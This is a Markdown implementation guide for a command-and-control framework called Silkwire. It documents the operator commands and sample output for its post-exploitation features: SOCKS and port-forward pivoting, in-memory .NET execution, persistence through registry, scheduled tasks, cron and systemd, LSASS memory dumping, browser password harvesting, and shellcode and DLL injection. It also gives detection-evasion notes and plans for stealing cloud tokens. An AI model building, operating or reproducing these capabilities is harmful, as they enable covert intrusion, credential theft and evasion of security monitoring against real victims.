# Tier 1 High-Impact Features - Implementation Guide

## Overview

This document describes the Tier 1 high-impact features added to Silkwire C2 framework. These features significantly enhance the framework's post-exploitation capabilities.

## Feature Categories

### 1. SOCKS Proxy & Port Forwarding

**Purpose**: Enable network pivoting through compromised hosts to access internal networks.

#### SOCKS5 Proxy
- **Command**: `socks start [port]` / `socks stop`
- **Default Port**: 1080
- **Implementation**: Full SOCKS5 protocol support
- **Use Case**: Proxy tools through compromised host to access internal services

**Example Usage**:
```
(session) > socks start 1080
[*] Starting SOCKS5 proxy on port 1080...
[*] Executing... .
[*] SOCKS5 proxy started successfully on 127.0.0.1:1080

# Configure your browser or tools to use localhost:1080 as SOCKS5 proxy
# Now traffic routes through the compromised implant
```

#### Port Forwarding
- **Commands**:
  - `portfwd add <bind_port> <forward_host> <forward_port>`
  - `portfwd remove <bind_port>`
  - `portfwd list`
- **Implementation**: TCP port forwarding
- **Use Case**: Forward specific ports for service access

**Example Usage**:
```
(session) > portfwd add 3389 192.168.10.50 3389
[*] Adding port forward: 3389 -> 192.168.10.50:3389
[*] Port forward created - connect to localhost:3389 to access internal RDP

(session) > portfwd list
[*] Active port forwards:
- 3389 -> 192.168.10.50:3389
- SOCKS proxy: enabled on port 1080
```

**Files**:
- `implant/socks.go` - SOCKS5 and port forwarding implementation

---

### 2. In-Memory .NET Assembly Execution

**Purpose**: Execute .NET assemblies without writing to disk, bypassing file-based detection.

#### Execute-Assembly
- **Command**: `execute-assembly <path_to_assembly> [args...]`
- **Aliases**: `exec-asm`
- **Platform**: Windows only (uses CLR hosting)
- **Implementation**:
  - Primary: In-memory CLR hosting via COM interfaces
  - Fallback: Temporary file execution with cleanup

**Example Usage**:
```
(session) > execute-assembly ./Seatbelt.exe -group=system
[*] Executing assembly Seatbelt.exe (245 KB) with args: [-group=system]
[*] Executing... .....
[*] Success

# Output shows Seatbelt execution results
```

**Supported Tools**:
- Seatbelt (situational awareness)
- Rubeus (Kerberos attacks)
- SharpHound (AD enumeration)
- Custom .NET assemblies

**Files**:
- `implant/dotnet_windows.go` - Windows CLR hosting implementation
- `implant/dotnet_unix.go` - Unix stub (not supported)

---

### 3. Persistence Mechanisms

**Purpose**: Maintain access to compromised systems across reboots.

#### Windows Persistence Methods
- **registry** - HKCU Run key
- **task** - Scheduled Task (runs at logon)
- **service** - Windows Service (auto-start)
- **startup** - Startup folder shortcut

#### Linux/macOS Persistence Methods
- **cron** - Crontab (@reboot entry)
- **systemd** - User systemd service
- **bashrc** - .bashrc execution
- **profile** - Shell profile (.bash_profile, .zshrc)
- **launchd** - macOS LaunchAgent (macOS only)

#### Commands
- `persist install <method>` - Install persistence
- `persist remove <method>` - Remove persistence
- `persist list` - List all installed persistence

**Example Usage**:
```
# Windows
(session) > persist install registry
[*] Installing persistence using method: registry
[*] Registry Run key created: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

(session) > persist list
[*] Installed persistence mechanisms:
- registry: installed (HKCU\...\Run)
- task: not installed
- service: not installed
- startup: not installed

# Linux
(session) > persist install cron
[*] Cron job added for @reboot execution

(session) > persist install systemd
[*] Systemd service created: ~/.config/systemd/user/system-monitor.service
```

**Files**:
- `implant/persistence_windows.go` - Windows persistence methods
- `implant/persistence_unix.go` - Linux/macOS persistence methods

---

### 4. Credential Harvesting

**Purpose**: Extract credentials from browsers, memory, and system stores.

#### LSASS Dumping (Windows)
- **Command**: `lsass`
- **Requires**: SYSTEM or Administrator privileges
- **Method**: MiniDumpWriteDump via comsvcs.dll
- **Output**: Base64-encoded memory dump

**Example**:
```
(session) > lsass
[*] Dumping LSASS process memory (requires SYSTEM/Admin)...
[*] LSASS dump created: 45 MB
[*] Use Mimikatz offline to parse: mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"
```

#### Browser Password Harvesting
- **Command**: `harvest <chrome|firefox|edge|all>`
- **Browsers**: Chrome, Firefox, Edge
- **Platforms**: Windows, Linux, macOS
- **Decryption**:
  - Windows: DPAPI decryption
  - Linux/macOS: Keyring access required

**Example**:
```
(session) > harvest all
[*] Harvesting all browser credentials...
[*] Chrome: 23 credentials extracted
[*] Firefox: 15 credentials extracted
[*] Edge: 8 credentials extracted
[*] Total: 46 credentials

# Output includes:
# - URLs
# - Usernames
# - Decrypted passwords
```

#### Additional Unix Harvesting
- SSH private keys (`~/.ssh/id_rsa`, etc.)
- Bash history
- Environment variables
- Shadow file (if root)

**Files**:
- `implant/credentials_windows.go` - Windows credential harvesting
- `implant/credentials_unix.go` - Unix credential harvesting

---

### 5. Process Injection & Migration

**Purpose**: Inject code into other processes for stealth and privilege escalation.

#### Shellcode Injection
- **Command**: `inject-shellcode <pid> <shellcode_file>`
- **Method**: Classic DLL injection (VirtualAllocEx + CreateRemoteThread)
- **Platform**: Primarily Windows
- **Use Case**: Inject custom shellcode (Meterpreter, Cobalt Strike beacons)

**Example**:
```
(session) > inject-shellcode 1234 payload.bin
[*] Injecting 4096 bytes of shellcode into PID 1234
[*] Shellcode injected at 0x7FF6A0000000
[*] Remote thread created: TID 5678
```

#### DLL Injection
- **Command**: `inject-dll <pid> <dll_path>`
- **Method**: LoadLibraryA via CreateRemoteThread
- **Platform**: Windows
- **Use Case**: Inject custom DLLs

**Example**:
```
(session) > inject-dll 1234 C:\malicious.dll
[*] Injecting DLL into PID 1234
[*] DLL loaded at module handle: 0x7FF6B0000000
```

#### Process Migration
- **Command**: `migrate <pid>`
- **Method**: Inject implant into target process
- **Platform**: Windows (primary), Linux (limited via ptrace)
- **Use Case**: Move implant to more stable/privileged process

**Example**:
```
(session) > ps
[*] Process list:
PID    NAME                USER
1234   explorer.exe        SYSTEM
5678   svchost.exe         SYSTEM

(session) > migrate 5678
[*] Migrating to PID 5678...
[*] Migration successful - now running in svchost.exe
```

#### Spawn and Inject
- **Command**: `spawn-inject <shellcode_file> [process_path]`
- **Method**: Create suspended process + inject + resume
- **Default**: notepad.exe (Windows) / /bin/bash (Linux)
- **Use Case**: Clean process for shellcode execution

**Example**:
```
(session) > spawn-inject payload.bin notepad.exe
[*] Spawning notepad.exe and injecting 4096 bytes
[*] Process created: PID 9999
[*] Shellcode injected successfully
```

**Files**:
- `implant/injection_windows.go` - Windows injection techniques
- `implant/injection_unix.go` - Unix injection (ptrace-based, limited)

---

## Implementation Architecture

### Protobuf Definitions
All new command types added to `proto/c2.proto`:
```protobuf
// SOCKS & Port Forwarding
SOCKS_START = 22;
SOCKS_STOP = 23;
PORTFWD_ADD = 24;
PORTFWD_REMOVE = 25;
PORTFWD_LIST = 26;

// .NET Assembly Execution
EXECUTE_ASSEMBLY = 27;

// Persistence
PERSIST_INSTALL = 28;
PERSIST_REMOVE = 29;
PERSIST_LIST = 30;

// Credential Harvesting
DUMP_LSASS = 31;
HARVEST_CHROME = 32;
HARVEST_FIREFOX = 33;
HARVEST_EDGE = 34;
HARVEST_ALL_BROWSERS = 35;

// Process Injection
INJECT_SHELLCODE = 36;
INJECT_DLL = 37;
MIGRATE = 38;
SPAWN_INJECT = 39;
```

### Command Flow
1. **Console** (`console/commands.go`) - User input → protobuf command
2. **Server** (`server/handlers.go`) - Routes command to implant
3. **Implant** (`implant/commands.go`) - Executes command
4. **Specialized Modules** - Feature-specific implementations

### Cross-Platform Support
| Feature | Windows | Linux | macOS |
|---------|---------|-------|-------|
| SOCKS Proxy | ✅ | ✅ | ✅ |
| Port Forward | ✅ | ✅ | ✅ |
| Execute-Assembly | ✅ | ❌ | ❌ |
| Persistence | ✅ (4 methods) | ✅ (3 methods) | ✅ (4 methods) |
| LSASS Dump | ✅ | ❌ | ❌ |
| Browser Harvest | ✅ (full decrypt) | ⚠️ (partial) | ⚠️ (partial) |
| Shellcode Inject | ✅ | ⚠️ (ptrace) | ⚠️ (ptrace) |
| DLL Inject | ✅ | ⚠️ (LD_PRELOAD) | ⚠️ (dylib) |
| Process Migration | ✅ | ❌ | ❌ |

## Security Considerations

### OPSEC Notes
1. **SOCKS Proxy**: Creates network connections that may be logged
2. **LSASS Dumping**: High-risk operation, often detected by EDR
3. **Process Injection**: May trigger behavioral analysis
4. **Persistence**: Registry/task changes visible in logs
5. **Browser Harvesting**: File access may trigger alerts

### Detection Evasion
- All features use obfuscated strings
- Browser harvesting copies databases to avoid locks
- Process injection uses classic techniques (consider adding advanced methods)
- Persistence uses legitimate-sounding names

### Privilege Requirements
| Feature | Privileges |
|---------|------------|
| SOCKS/Port Forward | User |
| Execute-Assembly | User |
| Persistence (User) | User |
| Persistence (System) | Administrator/root |
| LSASS Dump | SYSTEM/Administrator |
| Browser Harvest | User |
| Process Inject (User) | User |
| Process Inject (System) | Administrator/root |

## Future Enhancements

### Planned Additions
1. **Advanced Injection**: APC injection, Process Hollowing, Atom Bombing
2. **Reflective DLL**: In-memory DLL loading without LoadLibrary
3. **Token Manipulation**: Steal and impersonate tokens
4. **Kerberos Attacks**: Ticket manipulation
5. **DNS Tunneling**: Covert C2 channel
6. **Domain Fronting**: Hide C2 traffic

### Module Expansion
- Additional browser support (Opera, Brave, Vivaldi)
- WiFi password harvesting (Windows done, add Linux/macOS)
- Credential manager dumps (Windows Credential Manager, KeePass)
- Cloud token harvesting (AWS, Azure, GCP credentials)

## Testing

### Quick Test Commands
```bash
# Start server
make run-server

# Start implant
make run-client

# Connect console
make run-console

# Test commands (in console)
sessions
session <id>
socks start 1080
portfwd add 8080 127.0.0.1 80
persist list
harvest all
ps
```

### Compilation
```bash
# Regenerate protobuf
make proto

# Build all components
make build

# Cross-compile implants
make generate-implants
```

## Troubleshooting

### Common Issues

**SOCKS proxy not working**:
- Check firewall rules
- Verify port not in use
- Ensure proper SOCKS5 client configuration

**Execute-assembly fails**:
- Windows only feature
- Requires .NET Framework installed
- Check assembly compatibility (.NET 4.x)

**Persistence fails**:
- Check privileges
- Verify method supported on OS
- Review system logs for errors

**LSASS dump fails**:
- Requires Administrator/SYSTEM
- May be blocked by AV/EDR
- Try alternative credential dumping

**Injection fails**:
- Check target process architecture (x86 vs x64)
- Verify privileges
- Ensure target process not protected

## References

- Cobalt Strike Documentation
- Sliver C2 Framework
- Metasploit Meterpreter
- Windows API Documentation
- Linux ptrace(2) man page
